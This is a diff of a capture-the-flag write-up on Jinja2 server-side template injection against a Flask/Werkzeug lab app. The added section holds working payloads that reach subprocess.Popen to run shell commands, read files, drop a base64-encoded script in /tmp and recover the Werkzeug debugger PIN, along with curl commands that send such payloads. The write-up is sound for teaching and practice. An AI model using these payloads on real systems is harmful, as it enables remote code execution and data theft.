@@ -2,7 +2,7 @@
 
 ## Description
 
-- Introduction: Here you can customize your absolutely fat-free gingerbread man.  
+- Introduction: Here you can customize your absolutely fat-free gingerbread man.
   Note: Start your personal instance from the RESOURCES section on top.
 - Goal / Mission:  Besides the gingerbread men, there are other goodies there. Let's see if you can get the goodie, which is stored in `/flag.txt`.
 
@@ -17,11 +17,11 @@ From looking at the responses header the server is identifying as `Werkzeug/1.0.
 
 - CVE-2019-9948 (6.4/10): "Bypass"
 
-      urllib in Python 2.x through 2.7.16 supports the local_file: scheme, which makes it easier for remote attackers to bypass protection mechanisms that blacklist file: URIs, as demonstrated by triggering a urllib.urlopen('local_file:///etc/passwd') call. 
+      urllib in Python 2.x through 2.7.16 supports the local_file: scheme, which makes it easier for remote attackers to bypass protection mechanisms that blacklist file: URIs, as demonstrated by triggering a urllib.urlopen('local_file:///etc/passwd') call.
 
 - CVE-2019-9636 (5.0/10):
 
-      Python 2.7.x through 2.7.16 and 3.x through 3.7.2 is affected by: **Improper Handling of Unicode Encoding** (with an incorrect netloc) during NFKC normalization. The impact is: Information disclosure (credentials, cookies, etc. that are cached against a given hostname). The components are: **urllib.parse.urlsplit, urllib.parse.urlparse**. The attack vector is: A specially crafted URL could be incorrectly parsed to locate cookies or authentication data and send that information to a different host than when parsed correctly. 
+      Python 2.7.x through 2.7.16 and 3.x through 3.7.2 is affected by: **Improper Handling of Unicode Encoding** (with an incorrect netloc) during NFKC normalization. The impact is: Information disclosure (credentials, cookies, etc. that are cached against a given hostname). The components are: **urllib.parse.urlsplit, urllib.parse.urlparse**. The attack vector is: A specially crafted URL could be incorrectly parsed to locate cookies or authentication data and send that information to a different host than when parsed correctly.
 
 - CVE-2018-20852 (5.0/10):
 
@@ -29,11 +29,11 @@ From looking at the responses header the server is identifying as `Werkzeug/1.0.
 
 - CVE-2019-9947 (4.3/10):
 
-      An issue was discovered in urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3. **CRLF injection is possible if the attacker controls a url parameter**, as demonstrated by the first argument to urllib.request.urlopen with \r\n (specifically in the path component of a URL that lacks a ? character) followed by an HTTP header or a Redis command. This is similar to the CVE-2019-9740 query string issue. 
+      An issue was discovered in urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3. **CRLF injection is possible if the attacker controls a url parameter**, as demonstrated by the first argument to urllib.request.urlopen with \r\n (specifically in the path component of a URL that lacks a ? character) followed by an HTTP header or a Redis command. This is similar to the CVE-2019-9740 query string issue.
 
 - CVE-2019-9740 (4.3/10):
 
-      An issue was discovered in urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3. CRLF injection is possible if the attacker controls a url parameter, as demonstrated by the first argument to urllib.request.urlopen with \r\n (specifically in the query string after a ? character) followed by an HTTP header or a Redis command. 
+      An issue was discovered in urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3. CRLF injection is possible if the attacker controls a url parameter, as demonstrated by the first argument to urllib.request.urlopen with \r\n (specifically in the query string after a ? character) followed by an HTTP header or a Redis command.
 
 
 The `CVE-2019-9948` "Bypass" vulnerability would be good to access the URL `/flag.txt`. The question is whether we do have somewhere an URL which can be influenced by our request.
@@ -55,7 +55,7 @@ So we will now try to exploit this environment!
     name = {{urllib.urlopen('local_file:///etc/passwd')}}
 
 **Error:**
-    
+
     jinja2.exceptions.UndefinedError
 
     UndefinedError: 'urllib' is undefined
@@ -68,7 +68,7 @@ The error message leaked parts of `/opt/app/app.py`:
 def main(eyes="*", name="Hacker"):
   eyes = request.form.get('eyes', "*")
   name = request.form.get('name', "Hacker")
- 
+
   text = Environment(loader=BaseLoader()).from_string("Hello, mighty " + name).render()
   print("Text: " + text)
   t = wrap(text, width=30)
@@ -91,7 +91,7 @@ Trying to know what is "available":
 **Output:**
 
     {
-        '_TemplateReference__context': <Context 
+        '_TemplateReference__context': <Context
             {
                 'range': <type 'xrange'>,
                 'dict': <type 'dict'>,
@@ -99,7 +99,7 @@ Trying to know what is "available":
                 'joiner': <class 'jinja2.utils.Joiner'>,
                 'namespace': <class 'jinja2.utils.Namespace'>,
                 'lipsum': <function generate_lorem_ipsum at 0x7f56b3127050>
-            } 
+            }
         of None>
     }
 
@@ -122,7 +122,7 @@ So I try: `{{ ''.__class__.__mro__ }}` to find the `object` class. And `{{ ''.__
 
 **Output:**
 
-  An array of 311 objects (see [`python_mro.txt`](python_mro.txt)). 
+  An array of 311 objects (see [`python_mro.txt`](python_mro.txt)).
   As we care about `subprocess.Popen` we find index 258 as the relevant to continue our exploit development.
 
 ---
@@ -137,7 +137,7 @@ Now we have access to execute shell commands.
 
 It seems to be running, but no output is generated... The `stdout` object is "None". This might be because the process is running in parallel and it has not yet been initialized (_this is a wrong assumption_).
 
-So I try the `wait()` command to ensure that the child process is being waited on. 
+So I try the `wait()` command to ensure that the child process is being waited on.
 
 **Input:** for `ls /flag.txt`
 
@@ -160,3 +160,93 @@ With this knowledge we can now read the flag using `cat /flag.txt`:
 we get the flag shown in the output:
 
     HV20{SST1_N0t_0NLY_H1Ts_UB3R!!!}
+
+## Alternate approach: Read the file directly
+
+Thanks to brp64 to pointing me to the site [Flask & Jinja2 SSTI Cheatsheet](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti), I learned about a much easier method to access the flags content: Open the file for reading.
+
+This can be done with the following input:
+
+    {{"".__class__.mro()[2].__subclasses__()[40]('/flag.txt', 'r').read()}}
+
+
+## Alternate approach: Find the PIN for the built in debugger shell
+
+In the Discord channel were discussions about getting the "Werkzeug" debugger shell (which is shown when ever an exception occured) could be accessed.
+Currently it is protected with a PIN. According to discussions, the PIN is not stored in the filesystem and the corresponding environment variable `WERKZEUG_DEBUG_PIN` is not set or it is not readable from our Flask process.
+
+A hint from Wurzel was intriguing: try to access `werkzeug.debug.get_pin_and_cookie_name`.
+
+Therefore I was looking into further interesting classes (beside `subprocess.Popen`) and found one: `werkzeug.debug.DebuggedApplication`
+
+Let's explore whether we can solve the challenge using this object.
+
+Getting all its properties/functions
+
+    {{ ''.__class__.__mro__[2].__subclasses__()[304].__dict__}}
+
+    {{ ''.__class__.__mro__[2].__subclasses__()[304].pin()
+
+Does not work. We need an instance of `DebuggedApplication`...
+
+But perhaps we can climb from our `self` to some global object?
+
+    {{ self._TemplateReference__context.environment.__dict__ }}
+
+
+A hint from wurzel did indicate how the solution would look like:
+
+    URL=https://your.idocker.vuln.land/
+    curl -X POST $URL -d "name={{[].class.base.subclasses()[258](["echo from flask import Flask;import werkzeug.debug;app = Flask(name);print(werkzeug.debug.get_pin_and_cookie_name(app)) >/tmp/test"], shell=True)}}"
+    curl -X POST $URL -d "name={{[].class.base.subclasses()[258](["python /tmp/test > /tmp/test1 2>/tmp/test2"], shell=True)}}"
+    curl -X POST $URL -d "name={{[].class.base.subclasses()[40]("/tmp/test1").read()}}"
+
+I couldn't execute it as it was... Perhaps this `class`, `base` and `subclasses` was some Python3 stuff. So I could adapt the necessary `name` inputs:
+
+    {{ ''.__class__.__mro__[2].__subclasses__()[258](['echo "from flask import Flask;import werkzeug.debug;app = Flask(\"name\");print(werkzeug.debug.get_pin_and_cookie_name(app))" >/tmp/test && echo "OK"'], shell=True, stdout=-1, stderr=-1).stdout.read()}}
+
+    {{ ''.__class__.__mro__[2].__subclasses__()[258](["python /tmp/test > /tmp/test1 2>/tmp/test2"], shell=True, stdout=-1, stderr=-1).stderr.read()}}
+
+    {{"".__class__.mro()[2].__subclasses__()[40]('/tmp/test1', 'r').read()}}
+
+
+But there is an execution problem (which can be read from `test2`, the error file:
+
+    {{"".__class__.mro()[2].__subclasses__()[40]('/tmp/test1', 'r').read()}}
+
+---
+
+    Traceback (most recent call last):
+
+    File "/tmp/test", line 1, in <module>
+    from flask import Flask;import werkzeug.debug;app = Flask(name);print(werkzeug.debug.get_pin_and_cookie_name(app))
+
+    NameError: name 'name' is not defined
+
+This indicates that the file could not be properly created (probably some ' or " were lost due to shell command parsing).
+
+So I wrote the [`v3_app.py`](v3_app.py) locally and base64 encoded it. 
+
+I then used the following commands to create the `/tmp/test0` file and decrypt it on the server:
+
+    {{ ''.__class__.__mro__[2].__subclasses__()[258](['echo "ZnJvbSBmbGFzayBpbXBvcnQgRmxhc2sKaW1wb3J0IHdlcmt6ZXVnLmRlYnVnCmFwcCA9IEZsYXNrKCJuYW1lIikKcHJpbnQod2Vya3pldWcuZGVidWcuZ2V0X3Bpbl9hbmRfY29va2llX25hbWUoYXBwKSkK" >/tmp/test0 && echo "OK"'], shell=True, stdout=-1, stderr=-1).stdout.read()}}
+
+    {{ ''.__class__.__mro__[2].__subclasses__()[258](['base64 -d /tmp/test0 > /tmp/test && echo "OK"'], shell=True, stdout=-1, stderr=-1).stdout.read()}}
+
+Execute the app and display the debugger PIN:
+
+    {{ ''.__class__.__mro__[2].__subclasses__()[258](["python /tmp/test 2>/tmp/test2"], shell=True, stdout=-1).stdout.read()}}
+
+Cleanup the server, removing the `/tmp/test*` files:
+    
+    {{ ''.__class__.__mro__[2].__subclasses__()[258](["rm /tmp/test*"], shell=True, stdout=-1, stderr=-1).stderr.read()}}
+
+
+With the PIN available, we have to open the debugger console. The easiest way is to to send the input `ä` to the site. This leads to a crash where we can click on the `terminal` symbol on the right side of a line of source code and provide the PIN to startup the console:
+
+![debugger-console.png](debugger-console.png)
+
+Here we can enter "regular Python" to read the `/flag.txt`:
+
+    open('/flag.txt', 'r').read()
+
